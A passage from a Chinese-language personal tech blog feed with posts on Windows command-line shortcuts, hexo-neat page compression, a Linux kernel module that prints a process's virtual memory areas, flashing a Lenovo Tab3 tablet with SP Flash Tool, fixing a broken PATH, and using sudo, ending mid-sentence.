class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runas /user:hackett_yu@outlook.com cmd</span><br><span class="line">doskey sudo=runas /user:{$username} cmd</span><br></pre></td></tr></tbody></table></figure><h3 id="快速进入命令行的方法"><a href="#快速进入命令行的方法" class="headerlink" title="快速进入命令行的方法"></a>快速进入命令行的方法</h3><p>如何从你的文件夹里快速打开命令行？请看下面</p><p>1.将鼠标置于指定文件的空白处，按住Shift键的同时右击鼠标，这时在出来的右键菜单里会出现一个”打开命令行”  的菜—单选项，也有可能是“在此处打开Powershell窗口(s)”。这个具体和电脑个体设置有关。</p><p>2.直接在指定目录的地址栏中输入<code>cmd</code>,即可进入命令行模式，同理输入powershell也可以</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/58638/image-20201114173854864.png" alt="image-20201114173854864"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/58638/image-20201114173917127.png" alt="image-20201114173917127"></p><p>3.安装Windows Terminal ，在应用商店即可下载。（在地址栏输入wt也可以快速调出，但是不会定位到当前目录）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/58638/image-20201114174133879.png" alt="image-20201114174133879"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本站从即日起全面启用全站网页压缩</title>
      <link href="/posts/5772/"/>
      <url>/posts/5772/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要压缩页面静态资源"><a href="#为什么要压缩页面静态资源" class="headerlink" title="为什么要压缩页面静态资源"></a>为什么要压缩页面静态资源</h1><p>对于个人博客来说，优化页面的访问速度是很有必要的，如果打开你的个人站点，加载个首页就要十几秒，页面长时间处于空白状态，想必没什么人能够忍受得了吧。我个人觉得，如果能把页面的加载时间控制在三四秒内，就很不错了。</p><p>那么怎么提高博客的页面加载速度呢？可以从以下的几个方面去入手： </p><ol><li>将js文件尽可能放置到body的闭合标签之前，因为在加载或者引入js文件时是阻塞式的，如果我们在页面的最开始就引入这些js文件，而这些文件又比较大，会造成页面在渲染时长时间处于白屏状态。</li><li>尽量避免去引用访问速度非常低下的cdn或者图片，可以改用访问速度更快的cdn，或者将难以迅速加载的图片保存到自己的站点目录下，以免在加载图片时耗费了大量的时间，最后还加载不出来。</li><li>对页面的静态资源进行压缩，包括css、js和html等文件。我们自己添加的css和js文件为了可读性，往往会有很多换行和空格，这些对于浏览器来说并没什么用，甚至还会降低渲染页面的速度。至于html文件，由于Markdown转成html的bug，会导致页面存在大量的空白，如果你查看下页面的源代码，就会发现这些大量的空白符，十分难看。这也会造成页面渲染的性能问题。</li></ol><p><strong>本站主博客由jekyll构成，子博客由hexo构成，目前均已启用静态网页资源的压缩。</strong></p><h1 id="hexo的压缩静态资源插件"><a href="#hexo的压缩静态资源插件" class="headerlink" title="hexo的压缩静态资源插件"></a>hexo的压缩静态资源插件</h1><p>网上有很多相关的博文，常规的做法是使用<code>gulp</code>来进行压缩，<code>gulp</code>是<code>Node.js</code>下的自动构建工具，通过一列的task执行步骤进行自动流程化处理。</p><p>使用这种方法会比较麻烦，每次压缩时还需要输入额外的命令，比较繁琐，个人不是很喜欢，有兴趣的可以去自己了解下<a href="https://segmentfault.com/a/1190000009544924#articleHeader8">相关的东西</a>。这篇教程里很多详细的说明，里边有说到gulp的使用，绝对的精品文章。</p><p>这里我选择的是由rozbo大佬开发的<code>hexo-neat</code>压缩插件，配置简单，无需额外命令，你只要使用原本的调试三连或者部署三连就可以自动帮你完成静态资源的压缩！</p><h2 id="如何使用hexo-neat"><a href="#如何使用hexo-neat" class="headerlink" title="如何使用hexo-neat"></a>如何使用hexo-neat</h2><h3 id="在站点根目录下安装hexo-neat"><a href="#在站点根目录下安装hexo-neat" class="headerlink" title="在站点根目录下安装hexo-neat"></a>在站点根目录下安装hexo-neat</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-neat --save1</span><br></pre></td></tr></tbody></table></figure><h3 id="为站点配置文件添加相关配置"><a href="#为站点配置文件添加相关配置" class="headerlink" title="为站点配置文件添加相关配置"></a>为站点配置文件添加相关配置</h3><p>下边是我自己站点的相关配置，直接添加到站点配置文件<code>_config.yml</code>的末尾就可以。可以安装自己的需求去自定义配置，不过有些注意事项，可以参考我后文的踩坑记录。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># hexo-neat</span><br><span class="line"># 博文压缩</span><br><span class="line">neat_enable: true</span><br><span class="line"># 压缩html</span><br><span class="line">neat_html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line"># 压缩css  </span><br><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">    - '**/*.min.css'</span><br><span class="line"># 压缩js</span><br><span class="line">neat_js:</span><br><span class="line">  enable: true</span><br><span class="line">  mangle: true</span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">    - '**/*.min.js'</span><br><span class="line">    - '**/jquery.fancybox.pack.js'</span><br><span class="line">    - '**/index.js'  12345678910111213141516171819202122</span><br></pre></td></tr></tbody></table></figure><h2 id="hexo-neat插件踩坑记录"><a href="#hexo-neat插件踩坑记录" class="headerlink" title="hexo-neat插件踩坑记录"></a>hexo-neat插件踩坑记录</h2><p>由于在使用hexo-neat插件时，可以在命令窗口中看到各个文件的压缩率，于是我就开始捣鼓跳过哪些文件可以让效率更高。在鼓捣了一段时间之后，记录下使用该插件的一些注意事项，避免日后重蹈覆辙，也希望能对各位看官有所帮助。</p><h3 id="跳过压缩文件的正确配置方式"><a href="#跳过压缩文件的正确配置方式" class="headerlink" title="跳过压缩文件的正确配置方式"></a>跳过压缩文件的正确配置方式</h3><p>如果按照官方插件的文档说明来配置<code>exclude</code>，你会发现完全不起作用。这是因为配置的文件路径不对，压缩时找不到你配置的文件，自然也就无法跳过了。你需要给这些文件指定正确的路径，万能的配置方式如下：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">    - '**/*.min.css'1234</span><br></pre></td></tr></tbody></table></figure><h3 id="压缩html时不要跳过-md文件"><a href="#压缩html时不要跳过-md文件" class="headerlink" title="压缩html时不要跳过.md文件"></a>压缩html时不要跳过<code>.md</code>文件</h3><p><code>.md</code>文件就是我们写文章时的markdown文件，如果跳过压缩<code>.md</code>文件，而你又刚好在文章中使用到了NexT自带的tab标签，那么当hexo在生成静态页面时就会发生解析错误。这会导致使用到了tab标签的页面生成失败而无法访问。</p><p>当初为了找到这个原因花了我两个晚上的时间，简直是夜不能寐。</p><h3 id="压缩html时不要跳过-swig文件"><a href="#压缩html时不要跳过-swig文件" class="headerlink" title="压缩html时不要跳过.swig文件"></a>压缩html时不要跳过<code>.swig</code>文件</h3><p><code>.swig</code>文件是模板引擎文件，简单的说hexo可以通过这些文件来生成对应的页面。如果跳过这些文件，那么你将会发现，你的所有页面完全没有起到压缩的效果，页面源代码里依然存在着一大堆空白。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://github.com/rozbo/hexo-neat">GitHub项目地址</a></li><li><a href="https://segmentfault.com/a/1190000008082288">hexo博客压缩优化</a></li><li><a href="https://segmentfault.com/a/1190000005799759">Hexo-Neat介绍</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核模块编程小例子之查看虚拟内存VMA(virtual memory areas）信息</title>
      <link href="/posts/33535/"/>
      <url>/posts/33535/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：</p><p>在 32 位的系统上，线性地址空间为 4GB，其中用户进程占有 3GB 线性地址空间，内核占有 1GB 线性地址空间。由于虚拟内存的引入，使的每个进程都可拥有 3GB 的虚拟内存。</p><p>用户进程的虚拟地址空间包含若干区域，这些区域的分布方式因体系结构的差异而不同，但所有的方式都包含下列成分：</p><p>（1） 代码段：可执行文件的二进制代码</p><p>（2） 数据段：存储全局变量</p><p>（3） 栈：用于保存局部变量和实现函数调用</p><p>（4） 环境变量和命令行参数</p><p>（5） 程序使用的动态库的代码</p><p>（6） 用于映射文件内容的区域为便于描述，系统中进程的虚拟内存空间被划分为若干不同的区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在 Linux 内核中，这样的区域被称为虚拟内存区域(virtual memory areas，VMA)。一个 VMA 是一块连续的线性地址空间的抽象，它拥有自身的权限(可读，可写，可执行等) ，对进程而言，VMA 其实是虚拟空间的内存块，一个进程的所有资源由多个内存块组成。</p><p>每一个虚拟内存区域都由一个相关的 struct vm_area_struct 结构来描述。</p><p>本文将编写一个内核模块，通过此内核模块遍历一个用户进程中所有的 VMA，并且打印这些 VMA 的属性信息，如 VMA 的大小、起始地址等，并通过与“/proc/pid/maps”中显示的信息进行对比验证 VMA 信息是否正确。  </p></blockquote><p><strong>本文所使用的环境：</strong></p><blockquote><p>操作系统：4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p>gcc: 7.5.0</p><p>make:GNU Make 4.1</p></blockquote><ol><li><h5 id="编写模块程序"><a href="#编写模块程序" class="headerlink" title="编写模块程序"></a>编写模块程序</h5><p>参考代码如下，代码文件命名为“vma_test.c”</p></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vma_test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pid;</span><br><span class="line">module_param(pid, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printit</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">  <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> start, end, length;</span><br><span class="line"></span><br><span class="line">  mm = tsk-&gt;mm;</span><br><span class="line">  pr_info(<span class="string">"mm_struct addr = 0x%p\n"</span>, mm);</span><br><span class="line">  vma = mm-&gt;mmap;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 mmap_sem 读写信号量进行保护 */</span></span><br><span class="line">  down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">  pr_info(<span class="string">"vmas: vma start end length\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (vma) {</span><br><span class="line">      j++;</span><br><span class="line">      start = vma-&gt;vm_start;</span><br><span class="line">      end = vma-&gt;vm_end;</span><br><span class="line">      length = end - start;</span><br><span class="line">      pr_info(<span class="string">"%6d: %16p %12lx %12lx %8ld\n"</span>,</span><br><span class="line">          j, vma, start, end, length);</span><br><span class="line">      vma = vma-&gt;vm_next;</span><br><span class="line">  }</span><br><span class="line">  up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vma_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">  <span class="comment">/* 如果插入模块时未定义 pid 号，则使用当前 pid */</span></span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">      tsk = current;</span><br><span class="line">      pid = current-&gt;pid;</span><br><span class="line">      pr_info(<span class="string">"using current process\n"</span>);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">      tsk = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!tsk)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pr_info(<span class="string">" Examining vma's for pid=%d, command=%s\n"</span>, pid, tsk-&gt;comm);</span><br><span class="line">  printit(tsk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vma_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  pr_info(<span class="string">"Module exit\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(vma_init);</span><br><span class="line">module_exit(vma_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Yu"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"vma test"</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码中:</p><p>38-52 行是内核模块初始化函数 vma_init；</p><p>40-46 行目的是获取 pid，可在加载模块时可传递相关参数（即进程 pid）；如果没有传递参数，则使用当前进程，即执行 insmod 命令的进程；</p><p>45 行 pid_task()函数为获取任务的任务描述符信息，其返回值是 struct task_struct 结构体类型的变量；</p><p>50 行调用自定义的 printit()函数打印相关信息；</p><p>9-34 行是本实验核心函数；</p><p>16 行获取待检查进程的内存描述符 struct mm_struct 数据结构，该结构由struct task_struct 中的*mm 指向；</p><p>18 行获取 VMA 链表头，即 mm-&gt;mmap；</p><p>21 行开始遍历 VMA 链表,down_read()函数用于申请读信号量，因本程序只是读取 VMA 链表，所以申请读者类型即可，若需丢 VMA 链表进行修改，则需申请写者类型信号量；  </p><p>24-32 行遍历 VMA 链表，并对每个 VMA 打印其起始地址、终止地址和长度信<br>息；</p><p>33 行释放读者信号量。</p></blockquote><ol start="2"><li><h5 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h5><p>编写 Makefile 文件，文件名必须为“Makefile”  </p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m := vma_test.o</span><br><span class="line"></span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></tbody></table></figure></li><li><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>   使用 make 命令编译即可。  </p></li><li><h5 id="插入模块"><a href="#插入模块" class="headerlink" title="插入模块"></a>插入模块</h5><p>   先通过 top 命令查看进程，任意获取一个进程 pid，如图所示，  本例中获取apache2 进程的 pid 3509。  </p><p>   <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/33535/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvQXpOUkdQdmVUalpCWGY0LnBuZw" alt="image-20200608163648953"></p><p>   使 用 insmod 插 入 模 块 ， 并 传 参 。 如 图 所 示 ， 本 例 中 模 块 名 为“vma_test.ko”,pid 为 3509，则插入模块命令为：  </p></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod vma_test.ko pid=3509</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li><h5 id="查看程序打印信息"><a href="#查看程序打印信息" class="headerlink" title="查看程序打印信息"></a>查看程序打印信息</h5><p>通过 dmesg 命令查看 VMA 信息。如下图所示:</p></li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/33535/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvTWsxRTlnaFN3ajRQdjhVLnBuZw" alt="image-20200608164250039"></p><blockquote><p>从上图可看到 apache2 进程包含许多 VMA 区域，以第一个 VMA 区域为例，其起始地址为 0x564af2e3a000,结束地址为 564af2ed7000,长度为 643072 字节。  </p></blockquote><pre><code>如下图所示为从 proc 虚拟文件系统中查看相应进程第一个 VMA 的完整信息。  </code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/33535/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvb3NlejFpcmhMNHFRV2Z3LnBuZw" alt="image-20200608164609038"></p><blockquote><p>从以上两图中内容对比可知，本程序输出信息正确。  </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联想 Lenovo Tab3 10 Business TB3-X70F （国际版）线刷</title>
      <link href="/posts/13741/"/>
      <url>/posts/13741/</url>
      
        <content type="html"><![CDATA[<p>本文介绍将联想 Lenovo Tab3 10 Business TB3-X70F 刷成国际版的方法，或者可用此方法破解学习平板定制机</p><h3 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h3><p>1.下载工具包<br>链接：<a href="https://pan.baidu.com/s/155ta-glHLtbTmAGWHo1HrQ">https://pan.baidu.com/s/155ta-glHLtbTmAGWHo1HrQ</a><br>提取码：rfy4</p><p>2.安装驱动<br><a href="https://www.androidfilehost.com/?fid=24591000424943663">https://www.androidfilehost.com/?fid=24591000424943663</a><br>3.解压MediaTek SP Flash Tool和线刷包<br>4.管理员运行MediaTek SP Flash Tool<br>5.选择Download Only<br>6.线刷包里的scatter file，然后点Download<br>7.平板关机<br>8.按住音量加键的同时插入usb到电脑<br>9.当进度条变红开始刷机，当显示ok的时候刷机结束，重启即可。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/13741/20200606115349908.png" alt="在这里插入图片描述"></p><h3 id="English"><a href="#English" class="headerlink" title="English"></a>English</h3><p>1.Install MediaTek Preloader USB VCOM driver <a href="https://www.androidfilehost.com/?fid=24591000424943663">https://www.androidfilehost.com/?fid=24591000424943663</a></p><blockquote><p>Most importantly the Preloader USB VCOM driver that is essential for getting<br>the SmartPhone Flash Tool (SPFT) to work.</p><p>Contents:</p><p>Android\android_winusb.inf<br>Installs ADB (Android Debug Bridge, “USB-Debugging”) driver for<br>MediaTek’s vendor ID (VID_0E8D).<br>Optional. Your Android device might use a different vender ID anyway,<br>so you should first try the vendor’s ADB driver, if available.</p><p>CDC\cdc-acm.inf<br>Installs VCOM (virtual serial port) driver.<br>Required for the SPFT!</p><p>tetherxp.inf<br>“RNDIS-over-USB host driver for Intenet Sharing”.<br>You probably don’t need this.</p><p>wpdmtp.inf<br>Media Transfer Protocol (MTP) driver for MediaTek’s vendor ID.<br>You probably don’t need this on modern operating systems.</p><p>To install any of these INF files, first extract this ZIP archive.</p><p>Then, for Windows 8 and 10:<br>Simply right-click any extracted INF file,<br>and select “Install” in the appearing context menu.</p><p>For Windows 7:</p><ul><li>Open the Windows Device Manager</li><li>In the “Action” menu, click “Add legacy hardware”</li><li>Click Next</li><li>Select “Install the hardware that I manually select from a list (Advanced)”</li><li>Click Next</li><li>In the list, select “Ports (COM &amp; LPT)”</li><li>Click Next</li><li>Click “Have Disk…”</li><li>Browse for the INF file, e.g. cdc-acm.inf</li><li>Select the driver you want to install, e.g. “MediaTek PreLoader USB VCOM (Android)”</li><li>If a new device appears in the Device Manager with a yellow warning triangle<br>and error code 10, just select it and delete it (delete key). But do NOT delete<br>the driver software.</li></ul></blockquote><p>2.Install MediaTek SP Flash Tool (SPFT)<br>3.Extract firmware archive<br>4.Start SPFT<br>5.Make sure “Download Only” mode is selected<br>6.Load scatter file from extracted firmware<br>6.SPFT should auto-load firmware and verify checksum<br>7.Optional: select DA_SWSEC.bin as Download Agent<br>8.Optional: remove checkbox from partitions you do not want to flash<br>9.Click the Download button in SPFT<br>10.Turn off tablet completely<br>11.Hold volume-UP key on tablet while connecting it to PC via USB<br>12.After a few seconds, SPFT should find tablet and start<br>13.Release volume-UP key and wait for flashing to finish</p><blockquote><p>Note: when you load a scatter file, there MUST be a valid preloader<br>in the same directory as the scatter file, or else an error will<br>occur when you start a download/flash. You can clear the checkbox of<br>the preloader, so that it won’t be flashed, but its “Location” field<br>must be filled.</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 刷机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 所有命令无法使用的解决方法</title>
      <link href="/posts/36827/"/>
      <url>/posts/36827/</url>
      
        <content type="html"><![CDATA[<p>这是由于环境变量设置出错导致的 解决方法： 直接在命令行中输入以下代码，然后回车</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></tbody></table></figure><p> 然后输入如下代码， 把错误的环境变量修正：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/profile</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解管理root用户权限的sudo服务程序</title>
      <link href="/posts/48730/"/>
      <url>/posts/48730/</url>
      
        <content type="html"><![CDATA[<blockquote><p>sudo 命令允许特权用户以 root 用户身份运行全部或部分命令，但是理解其能做什么和不能做什么很有帮助。</p></blockquote><p>在你想要使用超级权限临时运行一条命令时，<code>sudo</code> 命令非常方便，但是当它不能如你期望的工作时，你也会遇到一些麻烦。比如说你想在某些日志文件结尾添加一些重要的信息，你可能会尝试这样做：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog</span><br><span class="line">-bash: /var/log/somelog: Permission denied</span><br></pre></td></tr></tbody></table></figure><p>好吧，看起来你似乎需要一些额外的特权。一般来说，你不能使用你的用户账号向系统日志中写入东西。我们使用 <code>sudo</code> 再尝试一次吧。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> !!</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog</span><br><span class="line">-bash: /var/log/somelog: Permission denied</span><br></pre></td></tr></tbody></table></figure><p>嗯，它还是没有啥反应。我们来试点不同的吧。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="string">'echo "Important note" &gt;&gt; /var/log/somelog'</span></span><br><span class="line"><span class="built_in">sudo</span>: <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog: <span class="built_in">command</span> not found</span><br></pre></td></tr></tbody></table></figure><p>也可以查看：<a href="https://www.networkworld.com/article/3242170/linux/invaluable-tips-and-tricks-for-troubleshooting-linux.html">在 Linux 下排查故障的宝贵提示和技巧</a>。</p><h3 id="接下来该干什么？"><a href="#接下来该干什么？" class="headerlink" title="接下来该干什么？"></a>接下来该干什么？</h3><p>上面在执行完第一条命令后的回应显示，我们缺少向日志文件写入时必须的特权。第二次，我们使用 root 权限运行了第一次的命令，但是返回了一个“没有权限”的错误。第三次，我们把整个命令放在一个引号里面再运行了一遍，返回了一个“没有发现命令”的错误。所以，到底错在哪里了呢？</p><ul><li>第一条命令：没有 root 特权，你无法向这个日志中写入东西。</li><li>第二条命令：你的超级权限没有延伸到重定向。</li><li>第三条命令：<code>sudo</code> 不理解你用引号括起来的整个 “命令”。</li></ul><p>而且如果你的用户还未添加到 sudo 用户组的时候，如果尝试使用 <code>sudo</code>，你可能已经看到过像下面的这么一条错误了：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nemo is not in the sudoers file. This incident will be reported.</span><br></pre></td></tr></tbody></table></figure><h3 id="你可以做什么？"><a href="#你可以做什么？" class="headerlink" title="你可以做什么？"></a>你可以做什么？</h3><p>一个相当简单的选择就是使用 <code>sudo</code> 命令暂时成为 root。鉴于你已经有了 sudo 特权，你可以使用下面的命令执行此操作：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> su</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> nemo:</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>注意这个改变的提示符表明了你的新身份。然后你就可以以 root 运行之前的命令了：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo "Important note" &gt;&gt; /var/log/somelog</span></span><br></pre></td></tr></tbody></table></figure><p>接着你可以输入 <code>^d</code> 返回你之前的身份。当然了，一些 sudo 的配置可能会阻止你使用 <code>sudo</code> 命令成为 root。</p><p>另一个切换用户为 root 的方法是仅用 <code>su</code> 命令，但是这需要你知道 root 密码。许多人被赋予了访问 sudo 的权限，而并不知道 root 密码，所以这并不是总是可行。</p><p>（采用 su 直接）切换到 root 之后，你就可以以 root 的身份运行任何你想执行的命令了。这种方式的问题是：1) 每个想要使用 root 特权的人都需要事先知道 root 的密码（这样不很安全）；2) 如果在运行需要 root 